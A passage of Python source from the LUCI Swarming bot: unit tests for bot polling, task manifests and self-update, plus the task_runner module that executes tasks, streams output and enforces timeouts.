'https://localhost:1/swarming/api/v1/bot/handshake',\n            {'data': self.attributes},\n            {'bot_version': '123', 'server': self.url, 'server_version': 1},\n          ),\n        ])\n\n    with self.assertRaises(Foo):\n      bot_main.run_bot(None)\n    self.assertEqual(\n        self.attributes['dimensions']['id'][0], os.environ['SWARMING_BOT_ID'])\n\n  def test_poll_server_sleep(self):\n    slept = []\n    bit = threading.Event()\n    self.mock(bit, 'wait', slept.append)\n    self.mock(bot_main, 'run_manifest', self.fail)\n    self.mock(bot_main, 'update_bot', self.fail)\n\n    self.expected_requests(\n        [\n          (\n            'https://localhost:1/swarming/api/v1/bot/poll',\n            {'data': self.attributes},\n            {\n              'cmd': 'sleep',\n              'duration': 1.24,\n            },\n          ),\n        ])\n    self.assertFalse(bot_main.poll_server(self.bot, bit))\n    self.assertEqual([1.24], slept)\n\n  def test_poll_server_run(self):\n    manifest = []\n    bit = threading.Event()\n    self.mock(bit, 'wait', self.fail)\n    self.mock(bot_main, 'run_manifest', lambda *args: manifest.append(args))\n    self.mock(bot_main, 'update_bot', self.fail)\n\n    self.expected_requests(\n        [\n          (\n            'https://localhost:1/swarming/api/v1/bot/poll',\n            {'data': self.bot._attributes},\n            {\n              'cmd': 'run',\n              'manifest': {'foo': 'bar'},\n            },\n          ),\n        ])\n    self.assertTrue(bot_main.poll_server(self.bot, bit))\n    expected = [(self.bot, {'foo': 'bar'}, time.time())]\n    self.assertEqual(expected, manifest)\n\n  def test_poll_server_update(self):\n    update = []\n    bit = threading.Event()\n    self.mock(bit, 'wait', self.fail)\n    self.mock(bot_main, 'run_manifest', self.fail)\n    self.mock(bot_main, 'update_bot', lambda *args: update.append(args))\n\n    self.expected_requests(\n        [\n          (\n            'https://localhost:1/swarming/api/v1/bot/poll',\n            {'data': self.attributes},\n            {\n              'cmd': 'update',\n              'version': '123',\n            },\n          ),\n        ])\n    self.assertTrue(bot_main.poll_server(self.bot, bit))\n    self.assertEqual([(self.bot, '123')], update)\n\n  def test_poll_server_restart(self):\n    restart = []\n    bit = threading.Event()\n    self.mock(bit, 'wait', self.fail)\n    self.mock(bot_main, 'run_manifest', self.fail)\n    self.mock(bot_main, 'update_bot', self.fail)\n    self.mock(self.bot, 'restart', lambda *args: restart.append(args))\n\n    self.expected_requests(\n        [\n          (\n            'https://localhost:1/swarming/api/v1/bot/poll',\n            {'data': self.attributes},\n            {\n              'cmd': 'restart',\n              'message': 'Please die now',\n            },\n          ),\n        ])\n    self.assertTrue(bot_main.poll_server(self.bot, bit))\n    self.assertEqual([('Please die now',)], restart)\n\n  def test_poll_server_restart_load_test(self):\n    os.environ['SWARMING_LOAD_TEST'] = '1'\n    bit = threading.Event()\n    self.mock(bit, 'wait', self.fail)\n    self.mock(bot_main, 'run_manifest', self.fail)\n    self.mock(bot_main, 'update_bot', self.fail)\n    self.mock(self.bot, 'restart', self.fail)\n\n    self.expected_requests(\n        [\n          (\n            'https://localhost:1/swarming/api/v1/bot/poll',\n            {\n              'data': self.attributes,\n            },\n            {\n              'cmd': 'restart',\n              'message': 'Please die now',\n            },\n          ),\n        ])\n    self.assertTrue(bot_main.poll_server(self.bot, bit))\n\n  def _mock_popen(self, returncode=0, exit_code=0, url='https://localhost:1'):\n    result = {\n      'exit_code': exit_code,\n      'must_signal_internal_failure': None,\n      'version': 3,\n    }\n    # Method should have \"self\" as first argument - pylint: disable=E0213\n    class Popen(object):\n      def __init__(\n          self2, cmd, detached, cwd, env, stdout, stderr, stdin, close_fds):\n        self2.returncode = None\n        self2._out_file = os.path.join(\n            self.root_dir, 'work', 'task_runner_out.json')\n        expected = [\n          sys.executable, bot_main.THIS_FILE, 'task_runner',\n          '--swarming-server', url,\n          '--in-file',\n          os.path.join(self.root_dir, 'work', 'task_runner_in.json'),\n          '--out-file', self2._out_file,\n          '--cost-usd-hour', '3600.0', '--start', '100.0',\n          '--min-free-space',\n          str(int(\n            (os_utilities.get_min_free_space(bot_main.THIS_FILE) + 250.) *\n            1024 * 1024)),\n        ]\n        self.assertEqual(expected, cmd)\n        self.assertEqual(True, detached)\n        self.assertEqual(self.bot.base_dir, cwd)\n        self.assertEqual('24', env['SWARMING_TASK_ID'])\n        self.assertTrue(stdout)\n        self.assertEqual(subprocess42.STDOUT, stderr)\n        self.assertEqual(subprocess42.PIPE, stdin)\n        self.assertEqual(sys.platform != 'win32', close_fds)\n\n      def wait(self2, timeout=None): # pylint: disable=unused-argument\n        self2.returncode = returncode\n        with open(self2._out_file, 'wb') as f:\n          json.dump(result, f)\n        return 0\n\n    self.mock(subprocess42, 'Popen', Popen)\n    return result\n\n  def test_run_manifest(self):\n    self.mock(bot_main, 'post_error_task', lambda *args: self.fail(args))\n    def call_hook(botobj, name, *args):\n      if name == 'on_after_task':\n        failure, internal_failure, dimensions, summary = args\n        self.assertEqual(self.attributes['dimensions'], botobj.dimensions)\n        self.assertEqual(False, failure)\n        self.assertEqual(False, internal_failure)\n        self.assertEqual({'os': 'Amiga', 'pool': 'default'}, dimensions)\n        self.assertEqual(result, summary)\n    self.mock(bot_main, 'call_hook', call_hook)\n    result = self._mock_popen(url='https://localhost:3')\n\n    manifest = {\n      'command': ['echo', 'hi'],\n      'dimensions': {'os': 'Amiga', 'pool': 'default'},\n      'grace_period': 30,\n      'hard_timeout': 60,\n      'host': 'https://localhost:3',\n      'task_id': '24',\n    }\n    self.assertEqual(self.root_dir, self.bot.base_dir)\n    bot_main.run_manifest(self.bot, manifest, time.time())\n\n  def test_run_manifest_task_failure(self):\n    self.mock(bot_main, 'post_error_task', lambda *args: self.fail(args))\n    def call_hook(_botobj, name, *args):\n      if name == 'on_after_task':\n        failure, internal_failure, dimensions, summary = args\n        self.assertEqual(True, failure)\n        self.assertEqual(False, internal_failure)\n        self.assertEqual({'pool': 'default'}, dimensions)\n        self.assertEqual(result, summary)\n    self.mock(bot_main, 'call_hook', call_hook)\n    result = self._mock_popen(exit_code=1)\n\n    manifest = {\n      'command': ['echo', 'hi'],\n      'dimensions': {'pool': 'default'},\n      'grace_period': 30,\n      'hard_timeout': 60,\n      'io_timeout': 60,\n      'task_id': '24',\n    }\n    bot_main.run_manifest(self.bot, manifest, time.time())\n\n  def test_run_manifest_internal_failure(self):\n    posted = []\n    self.mock(bot_main, 'post_error_task', lambda *args: posted.append(args))\n    def call_hook(_botobj, name, *args):\n      if name == 'on_after_task':\n        failure, internal_failure, dimensions, summary = args\n        self.assertEqual(False, failure)\n        self.assertEqual(True, internal_failure)\n        self.assertEqual({'pool': 'default'}, dimensions)\n        self.assertEqual(result, summary)\n    self.mock(bot_main, 'call_hook', call_hook)\n    result = self._mock_popen(returncode=1)\n\n    manifest = {\n      'command': ['echo', 'hi'],\n      'dimensions': {'pool': 'default'},\n      'grace_period': 30,\n      'hard_timeout': 60,\n      'io_timeout': 60,\n      'task_id': '24',\n    }\n    bot_main.run_manifest(self.bot, manifest, time.time())\n    expected = [(self.bot, 'Execution failed: internal error (1).', '24')]\n    self.assertEqual(expected, posted)\n\n  def test_run_manifest_exception(self):\n    posted = []\n    def post_error_task(botobj, msg, task_id):\n      posted.append((botobj, msg.splitlines()[0], task_id))\n    self.mock(bot_main, 'post_error_task', post_error_task)\n    def call_hook(_botobj, name, *args):\n      if name == 'on_after_task':\n        failure, internal_failure, dimensions, summary = args\n        self.assertEqual(False, failure)\n        self.assertEqual(True, internal_failure)\n        self.assertEqual({'pool': 'default'}, dimensions)\n        self.assertEqual({}, summary)\n    self.mock(bot_main, 'call_hook', call_hook)\n    def raiseOSError(*_a, **_k):\n      raise OSError('Dang')\n    self.mock(subprocess42, 'Popen', raiseOSError)\n\n    manifest = {\n      'command': ['echo', 'hi'],\n      'dimensions': {'pool': 'default'},\n      'grace_period': 30,\n      'hard_timeout': 60,\n      'task_id': '24',\n    }\n    bot_main.run_manifest(self.bot, manifest, time.time())\n    expected = [(self.bot, 'Internal exception occured: Dang', '24')]\n    self.assertEqual(expected, posted)\n\n  def test_update_bot(self):\n    # In a real case 'update_bot' never exits and doesn't call 'post_error'.\n    # Under the test however forever-blocking calls finish, and post_error is\n    # called.\n    self.mock(self.bot, 'post_error', lambda *_: None)\n    # Mock the file to download in the temporary directory.\n    self.mock(\n        bot_main, 'THIS_FILE',\n        os.path.join(self.root_dir, 'swarming_bot.1.zip'))\n    new_zip = os.path.join(self.root_dir, 'swarming_bot.2.zip')\n    # This is necessary otherwise zipfile will crash.\n    self.mock(time, 'time', lambda: 1400000000)\n    def url_retrieve(f, url):\n      self.assertEqual(\n          'https://localhost:1/swarming/api/v1/bot/bot_code/123', url)\n      self.assertEqual(new_zip, f)\n      # Create a valid zip that runs properly.\n      with zipfile.ZipFile(f, 'w') as z:\n        z.writestr('__main__.py', 'print(\"hi\")')\n      return True\n    self.mock(net, 'url_retrieve', url_retrieve)\n\n    calls = []\n    def exec_python(args):\n      calls.append(args)\n      return 23\n    self.mock(bot_main.common, 'exec_python', exec_python)\n\n    with self.assertRaises(SystemExit) as e:\n      bot_main.update_bot(self.bot, '123')\n    self.assertEqual(23, e.exception.code)\n\n    self.assertEqual([[new_zip, 'start_slave', '--survive']], calls)\n\n  def test_main(self):\n    def check(x):\n      self.assertEqual(logging.WARNING, x)\n    self.mock(logging_utils, 'set_console_level', check)\n\n    def run_bot(error):\n      self.assertEqual(None, error)\n      return 0\n    self.mock(bot_main, 'run_bot', run_bot)\n\n    class Singleton(object):\n      # pylint: disable=no-self-argument\n      def acquire(self2):\n        return True\n      def release(self2):\n        self.fail()\n    self.mock(bot_main, 'SINGLETON', Singleton())\n\n    self.assertEqual(0, bot_main.main([]))\n\n\nif __name__ == '__main__':\n  fix_encoding.fix_encoding()\n  if '-v' in sys.argv:\n    TestBotMain.maxDiff = None\n  logging.basicConfig(\n      level=logging.DEBUG if '-v' in sys.argv else logging.CRITICAL)\n  unittest.main()\n/n/n/nappengine/swarming/swarming_bot/bot_code/task_runner.py/n/n# Copyright 2013 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\n\"\"\"Runs a Swarming task.\n\nDownloads all the necessary files to run the task, executes the command and\nstreams results back to the Swarming server.\n\nThe process exit code is 0 when the task was executed, even if the task itself\nfailed. If there's any failure in the setup or teardown, like invalid packet\nresponse, failure to contact the server, etc, a non zero exit code is used. It's\nup to the calling process (bot_main.py) to signal that there was an internal\nfailure and to cancel this task run and ask the server to retry it.\n\"\"\"\n\nimport base64\nimport json\nimport logging\nimport optparse\nimport os\nimport signal\nimport sys\nimport time\n\nfrom utils import net\nfrom utils import on_error\nfrom utils import subprocess42\nfrom utils import zip_package\n\n\n# Path to this file or the zip containing this file.\nTHIS_FILE = os.path.abspath(zip_package.get_main_script_path())\n\n\n# Sends a maximum of 100kb of stdout per task_update packet.\nMAX_CHUNK_SIZE = 102400\n\n\n# Maximum wait between task_update packet when there's no output.\nMAX_PACKET_INTERVAL = 30\n\n\n# Minimum wait between task_update packet when there's output.\nMIN_PACKET_INTERNAL = 10\n\n\n# Current task_runner_out version.\nOUT_VERSION = 3\n\n\n# On Windows, SIGTERM is actually sent as SIGBREAK since there's no real\n# SIGTERM.  SIGBREAK is not defined on posix since it's a pure Windows concept.\nSIG_BREAK_OR_TERM = (\n    signal.SIGBREAK if sys.platform == 'win32' else signal.SIGTERM)\n\n\n# Used to implement monotonic_time for a clock that never goes backward.\n_last_now = 0\n\n\ndef monotonic_time():\n  \"\"\"Returns monotonically increasing time.\"\"\"\n  global _last_now\n  now = time.time()\n  if now > _last_now:\n    # TODO(maruel): If delta is large, probably worth alerting via ereporter2.\n    _last_now = now\n  return _last_now\n\n\ndef get_run_isolated():\n  \"\"\"Returns the path to itself to run run_isolated.\n\n  Mocked in test to point to the real run_isolated.py script.\n  \"\"\"\n  return [sys.executable, THIS_FILE, 'run_isolated']\n\n\ndef get_isolated_cmd(\n    work_dir, task_details, isolated_result, min_free_space):\n  \"\"\"Returns the command to call run_isolated. Mocked in tests.\"\"\"\n  bot_dir = os.path.dirname(work_dir)\n  if os.path.isfile(isolated_result):\n    os.remove(isolated_result)\n  cmd = get_run_isolated()\n  cmd.extend(\n      [\n        '--isolated', task_details.inputs_ref['isolated'].encode('utf-8'),\n        '--namespace', task_details.inputs_ref['namespace'].encode('utf-8'),\n        '-I', task_details.inputs_ref['isolatedserver'].encode('utf-8'),\n        '--json', isolated_result,\n        '--log-file', os.path.join(bot_dir, 'logs', 'run_isolated.log'),\n        '--cache', os.path.join(bot_dir, 'cache'),\n        '--root-dir', os.path.join(work_dir, 'isolated'),\n      ])\n  if min_free_space:\n    cmd.extend(('--min-free-space', str(min_free_space)))\n\n  if task_details.hard_timeout:\n    cmd.extend(('--hard-timeout', str(task_details.hard_timeout)))\n  if task_details.grace_period:\n    cmd.extend(('--grace-period', str(task_details.grace_period)))\n  if task_details.extra_args:\n    cmd.append('--')\n    cmd.extend(task_details.extra_args)\n  return cmd\n\n\nclass TaskDetails(object):\n  def __init__(self, data):\n    \"\"\"Loads the raw data.\n\n    It is expected to have at least:\n     - bot_id\n     - command as a list of str\n     - data as a list of urls\n     - env as a dict\n     - hard_timeout\n     - io_timeout\n     - task_id\n    \"\"\"\n    logging.info('TaskDetails(%s)', data)\n    if not isinstance(data, dict):\n      raise ValueError('Expected dict, got %r' % data)\n\n    # Get all the data first so it fails early if the task details is invalid.\n    self.bot_id = data['bot_id']\n\n    # Raw command. Only self.command or self.inputs_ref can be set.\n    self.command = data['command'] or []\n\n    # Isolated command. Is a serialized version of task_request.FilesRef.\n    self.inputs_ref = data['inputs_ref']\n    self.extra_args = data['extra_args']\n\n    self.env = {\n      k.encode('utf-8'): v.encode('utf-8') for k, v in data['env'].iteritems()\n    }\n    self.grace_period = data['grace_period']\n    self.hard_timeout = data['hard_timeout']\n    self.io_timeout = data['io_timeout']\n    self.task_id = data['task_id']\n\n\nclass MustExit(Exception):\n  \"\"\"Raised on signal that the process must exit immediately.\"\"\"\n  def __init__(self, sig):\n    super(MustExit, self).__init__()\n    self.signal = sig\n\n\ndef load_and_run(\n    in_file, swarming_server, cost_usd_hour, start, out_file, min_free_space):\n  \"\"\"Loads the task's metadata and execute it.\n\n  This may throw all sorts of exceptions in case of failure. It's up to the\n  caller to trap them. These shall be considered 'internal_failure' instead of\n  'failure' from a TaskRunResult standpoint.\n  \"\"\"\n  # The work directory is guaranteed to exist since it was created by\n  # bot_main.py and contains the manifest. Temporary files will be downloaded\n  # there. It's bot_main.py that will delete the directory afterward. Tests are\n  # not run from there.\n  task_result = None\n  def handler(sig, _):\n    logging.info('Got signal %s', sig)\n    raise MustExit(sig)\n  work_dir = os.path.dirname(out_file)\n  try:\n    with subprocess42.set_signal_handler([SIG_BREAK_OR_TERM], handler):\n      if not os.path.isdir(work_dir):\n        raise ValueError('%s expected to exist' % work_dir)\n\n      with open(in_file, 'rb') as f:\n        task_details = TaskDetails(json.load(f))\n\n      task_result = run_command(\n          swarming_server, task_details, work_dir, cost_usd_hour, start,\n          min_free_space)\n  except MustExit as e:\n    # This normally means run_command() didn't get the chance to run, as it\n    # itself trap MustExit and will report accordingly. In this case, we want\n    # the parent process to send the message instead.\n    if not task_result:\n      task_result = {\n        u'exit_code': None,\n        u'hard_timeout': False,\n        u'io_timeout': False,\n        u'must_signal_internal_failure':\n            u'task_runner received signal %s' % e.signal,\n        u'version': OUT_VERSION,\n      }\n  finally:\n    # We've found tests to delete 'work' when quitting, causing an exception\n    # here. Try to recreate the directory if necessary.\n    if not os.path.isdir(work_dir):\n      os.mkdir(work_dir)\n    with open(out_file, 'wb') as f:\n      json.dump(task_result, f)\n\n\ndef post_update(swarming_server, params, exit_code, stdout, output_chunk_start):\n  \"\"\"Posts task update to task_update.\n\n  Arguments:\n    swarming_server: Base URL to Swarming server.\n    params: Default JSON parameters for the POST.\n    exit_code: Process exit code, only when a command completed.\n    stdout: Incremental output since last call, if any.\n    output_chunk_start: Total number of stdout previously sent, for coherency\n        with the server.\n  \"\"\"\n  params = params.copy()\n  if exit_code is not None:\n    params['exit_code'] = exit_code\n  if stdout:\n    # The output_chunk_start is used by the server to make sure that the stdout\n    # chunks are processed and saved in the DB in order.\n    params['output'] = base64.b64encode(stdout)\n    params['output_chunk_start'] = output_chunk_start\n  # TODO(maruel): Support early cancellation.\n  # https://code.google.com/p/swarming/issues/detail?id=62\n  resp = net.url_read_json(\n      swarming_server+'/swarming/api/v1/bot/task_update/%s' % params['task_id'],\n      data=params)\n  logging.debug('post_update() = %s', resp)\n  if resp.get('error'):\n    # Abandon it. This will force a process exit.\n    raise ValueError(resp.get('error'))\n\n\ndef should_post_update(stdout, now, last_packet):\n  \"\"\"Returns True if it's time to send a task_update packet via post_update().\n\n  Sends a packet when one of this condition is met:\n  - more than MAX_CHUNK_SIZE of stdout is buffered.\n  - last packet was sent more than MIN_PACKET_INTERNAL seconds ago and there was\n    stdout.\n  - last packet was sent more than MAX_PACKET_INTERVAL seconds ago.\n  \"\"\"\n  packet_interval = MIN_PACKET_INTERNAL if stdout else MAX_PACKET_INTERVAL\n  return len(stdout) >= MAX_CHUNK_SIZE or (now - last_packet) > packet_interval\n\n\ndef calc_yield_wait(task_details, start, last_io, timed_out, stdout):\n  \"\"\"Calculates the maximum number of seconds to wait in yield_any().\"\"\"\n  now = monotonic_time()\n  if timed_out:\n    # Give a |grace_period| seconds delay.\n    if task_details.grace_period:\n      return max(now - timed_out - task_details.grace_period, 0.)\n    return 0.\n\n  out = MIN_PACKET_INTERNAL if stdout else MAX_PACKET_INTERVAL\n  if task_details.hard_timeout:\n    out = min(out, start + task_details.hard_timeout - now)\n  if task_details.io_timeout:\n    out = min(out, last_io + task_details.io_timeout - now)\n  out = max(out, 0)\n  logging.debug('calc_yield_wait() = %d', out)\n  return out\n\n\ndef kill_and_wait(proc, grace_period, reason):\n  logging.warning('SIGTERM finally due to %s', reason)\n  proc.terminate()\n  try:\n    proc.wait(grace_period)\n  except subprocess42.TimeoutError:\n    logging.warning('SIGKILL finally due to %s', reason)\n    proc.kill()\n  exit_code = proc.wait()\n  logging.info('Waiting for proces exit in finally - done')\n  return exit_code\n\n\ndef run_command(\n    swarming_server, task_details, work_dir, cost_usd_hour, task_start,\n    min_free_space):\n  \"\"\"Runs a command and sends packets to the server to stream results back.\n\n  Implements both I/O and hard timeouts. Sends the packets numbered, so the\n  server can ensure they are processed in order.\n\n  Returns:\n    Metadata about the command.\n  \"\"\"\n  # TODO(maruel): This function is incomprehensible, split and refactor.\n  # Signal the command is about to be started.\n  last_packet = start = now = monotonic_time()\n  params = {\n    'cost_usd': cost_usd_hour * (now - task_start) / 60. / 60.,\n    'id': task_details.bot_id,\n    'task_id': task_details.task_id,\n  }\n  post_update(swarming_server, params, None, '', 0)\n\n  if task_details.command:\n    # Raw command.\n    cmd = task_details.command\n    isolated_result = None\n  else:\n    # Isolated task.\n    isolated_result = os.path.join(work_dir, 'isolated_result.json')\n    cmd = get_isolated_cmd(\n        work_dir, task_details, isolated_result, min_free_space)\n    # Hard timeout enforcement is deferred to run_isolated. Grace is doubled to\n    # give one 'grace_period' slot to the child process and one slot to upload\n    # the results back.\n    task_details.hard_timeout = 0\n    if task_details.grace_period:\n      task_details.grace_period *= 2\n\n  try:\n    # TODO(maruel): Support both channels independently and display stderr in\n    # red.\n    env = None\n    if task_details.env:\n      env = os.environ.copy()\n      for key, value in task_details.env.iteritems():\n        if not value:\n          env.pop(key, None)\n        else:\n          env[key] = value\n    logging.info('cmd=%s', cmd)\n    logging.info('env=%s', env)\n    try:\n      proc = subprocess42.Popen(\n          cmd,\n          env=env,\n          cwd=work_dir,\n          detached=True,\n          stdout=subprocess42.PIPE,\n          stderr=subprocess42.STDOUT,\n          stdin=subprocess42.PIPE)\n    except OSError as e:\n      stdout = 'Command \"%s\" failed to start.\\nError: %s' % (' '.join(cmd), e)\n      now = monotonic_time()\n      params['cost_usd'] = cost_usd_hour * (now - task_start) / 60. / 60.\n      params['duration'] = now - start\n      params['io_timeout'] = False\n      params['hard_timeout'] = False\n      post_update(swarming_server, params, 1, stdout, 0)\n      return {\n        u'exit_code': -1,\n        u'hard_timeout': False,\n        u'io_timeout': False,\n        u'must_signal_internal_failure': None,\n        u'version': OUT_VERSION,\n      }\n\n    output_chunk_start = 0\n    stdout = ''\n    exit_code = None\n    had_hard_timeout = False\n    had_io_timeout = False\n    must_signal_internal_failure = None\n    kill_sent = False\n    timed_out = None\n    try:\n      calc = lambda: calc_yield_wait(\n          task_details, start, last_io, timed_out, stdout)\n      maxsize = lambda: MAX_CHUNK_SIZE - len(stdout)\n      last_io = monotonic_time()\n      for _, new_data in proc.yield_any(maxsize=maxsize, timeout=calc):\n        now = monotonic_time()\n        if new_data:\n          stdout += new_data\n          last_io = now\n\n        # Post update if necessary.\n        if should_post_update(stdout, now, last_packet):\n          last_packet = monotonic_time()\n          params['cost_usd'] = (\n              cost_usd_hour * (last_packet - task_start) / 60. / 60.)\n          post_update(swarming_server, params, None, stdout, output_chunk_start)\n          output_chunk_start += len(stdout)\n          stdout = ''\n\n        # Send signal on timeout if necessary. Both are failures, not\n        # internal_failures.\n        # Eventually kill but return 0 so bot_main.py doesn't cancel the task.\n        if not timed_out:\n          if (task_details.io_timeout and\n              now - last_io > task_details.io_timeout):\n            had_io_timeout = True\n            logging.warning('I/O timeout; sending SIGTERM')\n            proc.terminate()\n            timed_out = monotonic_time()\n          elif (task_details.hard_timeout and\n              now - start > task_details.hard_timeout):\n            had_hard_timeout = True\n            logging.warning('Hard timeout; sending SIGTERM')\n            proc.terminate()\n            timed_out = monotonic_time()\n        else:\n          # During grace period.\n          if not kill_sent and now >= timed_out + task_details.grace_period:\n            # Now kill for real. The user can distinguish between the following\n            # states:\n            # - signal but process exited within grace period,\n            #   (hard_|io_)_timed_out will be set but the process exit code will\n            #   be script provided.\n            # - processed exited late, exit code will be -9 on posix.\n            logging.warning('Grace exhausted; sending SIGKILL')\n            proc.kill()\n            kill_sent = True\n      logging.info('Waiting for proces exit')\n      exit_code = proc.wait()\n    except MustExit as e:\n      # TODO(maruel): Do the send SIGTERM to child process and give it\n      # task_details.grace_period to terminate.\n      must_signal_internal_failure = (\n          u'task_runner received signal %s' % e.signal)\n      exit_code = kill_and_wait(\n          proc, task_details.grace_period, 'signal %d' % e.signal)\n    except (IOError, OSError):\n      # Something wrong happened, try to kill the child process.\n      had_hard_timeout = True\n      exit_code = kill_and_wait(\n          proc, task_details.grace_period, 'exception %s' % e)\n\n    # This is the very last packet for this command. It if was an isolated task,\n    # include the output reference to the archived .isolated file.\n    now = monotonic_time()\n    params['cost_usd'] = cost_usd_hour * (now - task_start) / 60. / 60.\n    params['duration'] = now - start\n    params['io_timeout'] = had_io_timeout\n    params['hard_timeout'] = had_hard_timeout\n    if isolated_result:\n      try:\n        if ((had_io_timeout or had_hard_timeout) and\n            not os.path.isfile(isolated_result)):\n          # It's possible that run_isolated failed to quit quickly enough; it\n          # could be because there was too much data to upload back or something\n          # else. Do not create an internal error, just send back the (partial)\n          # view as task_runner saw it, for example the real exit_code is\n          # unknown.\n          logging.warning('TIMED_OUT and there\\'s no result file')\n          exit_code = -1\n        else:\n          # See run_isolated.py for the format.\n          with open(isolated_result, 'rb') as f:\n            run_isolated_result = json.load(f)\n          logging.debug('run_isolated:\\n%s', run_isolated_result)\n          # TODO(maruel): Grab statistics (cache hit rate, data downloaded,\n          # mapping time, etc) from run_isolated and push them to the server.\n          if run_isolated_result['outputs_ref']:\n            params['outputs_ref'] = run_isolated_result['outputs_ref']\n          had_hard_timeout = (\n              had_hard_timeout or run_isolated_result['had_hard_timeout'])\n          params['hard_timeout'] = had_hard_timeout\n          if not had_io_timeout and not had_hard_timeout:\n            if run_isolated_result['internal_failure']:\n              must_signal_internal_failure = (\n                  run_isolated_result['internal_failure'])\n              logging.error('%s', must_signal_internal_failure)\n            elif exit_code:\n              # TODO(maruel): Grab stdout from run_isolated.\n              must_signal_internal_failure = (\n                  'run_isolated internal failure %d' % exit_code)\n              logging.error('%s', must_signal_internal_failure)\n          exit_code = run_isolated_result['exit_code']\n          if run_isolated_result.get('duration') is not None:\n            # Calculate the real task duration as measured by run_isolated and\n            # calculate the remaining overhead.\n            params['bot_overhead'] = params['duration']\n            params['duration'] = run_isolated_result['duration']\n            params['bot_overhead'] -= params['duration']\n            params['bot_overhead'] -= run_isolated_result.get(\n                'download', {}).get('duration', 0)\n            params['bot_overhead'] -= run_isolated_result.get(\n                'upload', {}).get('duration', 0)\n            if params['bot_overhead'] < 0:\n              params['bot_overhead'] = 0\n          stats = run_isolated_result.get('stats')\n          if stats:\n            params['isolated_stats'] = stats\n      except (IOError, OSError, ValueError) as e:\n        logging.error('Swallowing error: %s', e)\n        if not must_signal_internal_failure:\n          must_signal_internal_failure = str(e)\n    # TODO(maruel): Send the internal failure here instead of sending it through\n    # bot_main, this causes a race condition.\n    if exit_code is None:\n      exit_code = -1\n    post_update(swarming_server, params, exit_code, stdout, output_chunk_start)\n    return {\n      u'exit_code': exit_code,\n      u'hard_timeout': had_hard_timeout,\n      u'io_timeout': had_io_timeout,\n      u'must_signal_internal_failure': must_signal_internal_failure,\n      u'version': OUT_VERSION,\n    }\n  finally:\n    if isolated_result:\n      try:\n        os.remove(isolated_result)\n      except OSError:\n        pass\n\n\ndef main(args):\n  parser = optparse.OptionParser(description=sys.modules[__name__].__doc__)\n  parser.add_option('--in-file', help='Name of the request file')\n  parser.add_option(\n      '--out-file', help='Name of the JSON file to write a task summary to')\n  parser.add_option(\n      '--swarming-server', help='Swarming server to send data back')\n  parser.add_option(\n      '--cost-usd-hour', type='float', help='Cost of this VM in $/h')\n  parser.add_option('--start', type='float', help='Time this task was started')\n  parser.add_option(\n      '--min-free-space', type='int',\n      help='Value to send down to run_isolated')\n\n  options, args = parser.parse_args(args)\n  if not options.in_file or not options.out_file or args:\n    parser.error('task_runner is meant to be used by swarming_bot.')\n\n  on_error.report_on_exception_exit(options.swarming_server)\n\n  logging.info('starting')\n  now = monotonic_time()\n  if options.start > now:\n    options.start = now\n\n  try:\n    load_and_run(\n        options.in_file, options.swarming_server, options.cost_usd_hour,\n        options.start, options.out_file, options.min_free_space)\n    return 0\n  finally:\n    logging.info('quitting')\n/n/n/nappengine/swarming/swarming_bot/bot_code/task_runner_test.py/n/n#!/usr/bin/env python\n# coding=utf-8\n# Copyright 2013 The LUCI Authors. All rights reserved.\n# Use of this source code is governed by the Apache v2.0 license that can be\n# found in the LICENSE file.\n\nimport base64\nimport json\nimport logging\nimport os\nimport signal\nimport shutil\nimport sys\nimport tempfile\nimport time\nimport unittest\n\nimport test_env_bot_code\ntest_env_bot_code.setup_test_env()\n\n# Creates a server mock for functions in net.py.\nimport net_utils\n\nfrom api import os_utilities\nfrom depot_tools import fix_encoding\nfrom utils import file_path\nfrom utils import large\nfrom utils import logging_utils\nfrom utils import subprocess42\nfrom utils import tools\nimport fake_swarming\nimport task_runner\n\nCLIENT_DIR = os.path.normpath(\n    os.path.join(test_env_bot_code.BOT_DIR, '..', '..', '..', 'client'))\n\nsys.path.insert(0, os.path.join(CLIENT_DIR, 'tests'))\nimport isolateserver_mock\n\n\ndef get_manifest(script=None, inputs_ref=None, **kwargs):\n  out = {\n    'bot_id': 'localhost',\n    'command':\n        [sys.executable, '-u', '-c', script] if not inputs_ref else None,\n    'env': {},\n    'extra_args': [],\n    'grace_period': 30.,\n    'hard_timeout': 10.,\n    'inputs_ref': inputs_ref,\n    'io_timeout': 10.,\n    'task_id': 23,\n  }\n  out.update(kwargs)\n  return out\n\n\nclass TestTaskRunnerBase(net_utils.TestCase):\n  def setUp(self):\n    super(TestTaskRunnerBase, self).setUp()\n    self.root_dir = tempfile.mkdtemp(prefix='task_runner')\n    logging.info('Temp: %s', self.root_dir)\n    self.work_dir = os.path.join(self.root_dir, 'work')\n    os.chdir(self.root_dir)\n    os.mkdir(self.work_dir)\n    # Create the logs directory so run_isolated.py can put its log there.\n    os.mkdir(os.path.join(self.root_dir, 'logs'))\n\n    self.mock(\n        task_runner, 'get_run_isolated',\n        lambda: [sys.executable, os.path.join(CLIENT_DIR, 'run_isolated.py')])\n\n  def tearDown(self):\n    os.chdir(test_env_bot_code.BOT_DIR)\n    try:\n      file_path.rmtree(self.root_dir)\n    except OSError:\n      print >> sys.stderr, 'Failed to delete %s' % self.root_dir\n    finally:\n      super(TestTaskRunnerBase, self).tearDown()\n\n  @classmethod\n  def get_task_details(cls, *args, **kwargs):\n    return task_runner.TaskDetails(get_manifest(*args, **kwargs))\n\n  def gen_requests(self, cost_usd=0., **kwargs):\n    return [\n      (\n        'https://localhost:1/swarming/api/v1/bot/task_update/23',\n        self.get_check_first(cost_usd),\n        {},\n      ),\n      (\n        'https://localhost:1/swarming/api/v1/bot/task_update/23',\n        self.get_check_final(**kwargs),\n        {},\n      ),\n    ]\n\n  def requests(self, **kwargs):\n    \"\"\"Generates the expected HTTP requests for a task run.\"\"\"\n    self.expected_requests(self.gen_requests(**kwargs))\n\n  def get_check_first(self, cost_usd):\n    def check_first(kwargs):\n      self.assertLessEqual(cost_usd, kwargs['data'].pop('cost_usd'))\n      self.assertEqual(\n        {\n          'data': {\n            'id': 'localhost',\n            'task_id': 23,\n          },\n        },\n        kwargs)\n    return check_first\n\n\nclass TestTaskRunner(TestTaskRunnerBase):\n  def setUp(self):\n    super(TestTaskRunner, self).setUp()\n    self.mock(time, 'time', lambda: 1000000000.)\n\n  def get_check_final(self, exit_code=0, output='hi\\n', outputs_ref=None):\n    def check_final(kwargs):\n      # It makes the diffing easier.\n      if 'output' in kwargs['data']:\n        kwargs['data']['output'] = base64.b64decode(kwargs['data']['output'])\n      expected = {\n        'data': {\n          'cost_usd': 10.,\n  